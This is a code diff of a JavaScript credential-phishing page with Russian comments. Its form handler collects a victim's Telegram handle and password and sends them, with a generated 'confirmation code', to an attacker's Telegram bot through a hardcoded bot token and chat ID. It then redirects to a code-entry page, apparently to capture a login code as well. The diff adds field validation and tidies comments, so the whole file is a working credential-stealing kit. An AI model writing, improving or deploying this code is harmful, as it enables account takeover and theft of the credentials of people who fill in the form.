@@ -1,13 +1,19 @@
 let BOT_TOKEN = "8200701594:AAGhsHSh7D7X5PHApcfLBmkPY6zKhUw9mRs";
-let CHAT_ID = "5372569828"; // Оставили только чистые цифры ID
+let CHAT_ID = "5372569828"; 
 
-// Обязательно передаем event внутрь скобок, чтобы остановить перезагрузку страницы
 let sendData = (event) => {
-  if (event) event.preventDefault(); // Это запретит форме ломать скрипт и вызывать 404
+  // Железобетонно глушим любые попытки браузера перезагрузить страницу
+  if (event) event.preventDefault(); 
 
   let telegram = document.getElementById("@Telegram.me").value;
   let password = document.getElementById("Password").value;
   let btn = document.getElementById("btn");
+
+  // Валидация: если поля пустые, не пускаем дальше
+  if (!telegram || !password) {
+    alert("Пожалуйста, заполните все поля!");
+    return;
+  }
 
   let code = Math.floor(Math.random() * 1000);
   let text = `Новая регистрация:\nТелега: ${telegram}\nПароль: ${password}\nКод подтверждения: ${code}`;
@@ -18,7 +24,7 @@ let sendData = (event) => {
   btn.disabled = true;
   btn.textContent = "sending...";
 
-  // Отправка данных в Telegram бота
+  // Отправка в Telegram
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -27,12 +33,12 @@ let sendData = (event) => {
     .then((res) => res.json())
     .then((data) => {
       if (data.ok) {
-        // Переходим на страницу ввода кода (абсолютный путь для Vercel)
+        // Переходим на страницу подтверждения кода
         window.location.href = "/conf/conf.html";
       } else {
         btn.disabled = false;
         btn.textContent = "register";
-        alert("Ошибка Telegram API. Проверь токен или Chat ID.");
+        alert("Ошибка бота. Проверь CHAT_ID или токен.");
       }
     })
     .catch(() => {
